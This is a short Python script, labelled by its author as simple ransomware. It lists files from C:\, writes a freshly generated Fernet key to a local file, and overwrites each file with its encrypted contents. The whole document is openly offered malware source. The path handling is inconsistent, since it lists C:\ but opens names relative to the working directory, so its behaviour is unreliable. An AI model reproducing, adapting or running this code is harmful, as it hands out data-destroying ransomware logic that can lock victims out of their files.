import os
from cryptography.fernet import Fernet

# creating a simple ransomware to encrypt files
# created by Youssef/dark-lime-0

def main()->None:
    files=[]
    for file in os.listdir('C:\\'):
            if file == 'enc_file.py' or file =="thekey.key" or file == 'dec_file.py':
                    continue
            if os.path.isfile(file):
                    files.append(file)
    print(files)
    key = Fernet.generate_key()

    with open("thekey.key", 'wb') as thekey:    # save the decryption key into a file
        thekey.write(key)

    for file in files :                         # encrypt the files
        with open(file,'rb') as thefile:
            containts = thefile.read()
        enc_data = Fernet(key).encrypt(containts)
        with open(file, 'wb') as thefile :
            thefile.write(enc_data)

    print("Encryption Completed successfully !!")

if __name__=='__main__':
    main()



